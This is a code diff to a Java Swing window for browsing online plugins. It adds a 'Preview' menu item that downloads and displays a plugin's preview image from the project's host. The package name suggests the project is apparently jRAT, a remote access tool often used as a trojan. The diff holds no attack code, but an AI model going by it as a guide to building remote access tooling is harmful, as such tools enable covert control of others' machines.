@@ -9,6 +9,7 @@ import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.util.List;
 
+import javax.imageio.ImageIO;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
 import javax.swing.ImageIcon;
@@ -30,11 +31,13 @@ import javax.swing.event.ListSelectionListener;
 import javax.swing.table.DefaultTableCellRenderer;
 import javax.swing.table.DefaultTableModel;
 
+import pro.jrat.Constants;
 import pro.jrat.ErrorDialog;
 import pro.jrat.common.Version;
 import pro.jrat.extensions.ExtensionInstaller;
 import pro.jrat.extensions.OnlinePlugin;
 import pro.jrat.listeners.ExtensionInstallerListener;
+import pro.jrat.net.WebRequest;
 
 @SuppressWarnings("serial")
 public class FrameOnlinePlugins extends JFrame {
@@ -48,6 +51,7 @@ public class FrameOnlinePlugins extends JFrame {
 	private JProgressBar progressBar;
 	private JLabel lblStatus;
 	private JMenuItem mntmHelp;
+	private JMenuItem mntmPreview;
 
 	public FrameOnlinePlugins() {
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameOnlinePlugins.class.getResource("/icons/application_icon_large.png")));
@@ -143,6 +147,22 @@ public class FrameOnlinePlugins extends JFrame {
 				JOptionPane.showMessageDialog(null, help, "Help", JOptionPane.QUESTION_MESSAGE);
 			}
 		});
+		
+		mntmPreview = new JMenuItem("Preview");
+		mntmPreview.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				OnlinePlugin plugin = getPlugin((String) table.getValueAt(table.getSelectedRow(), 0));
+
+				try {
+					new FrameImage(ImageIO.read(WebRequest.getUrl(Constants.HOST + "/plugins/" + plugin.getName() + "/preview.png"))).setVisible(true);
+				} catch (Exception e) {
+					e.printStackTrace();
+					ErrorDialog.create(e);
+				}
+			}
+		});
+		mntmPreview.setIcon(new ImageIcon(FrameOnlinePlugins.class.getResource("/icons/images-stack.png")));
+		popupMenu.add(mntmPreview);
 		mntmHelp.setIcon(new ImageIcon(FrameOnlinePlugins.class.getResource("/icons/help.png")));
 		popupMenu.add(mntmHelp);
 		scrollPane.setViewportView(table);
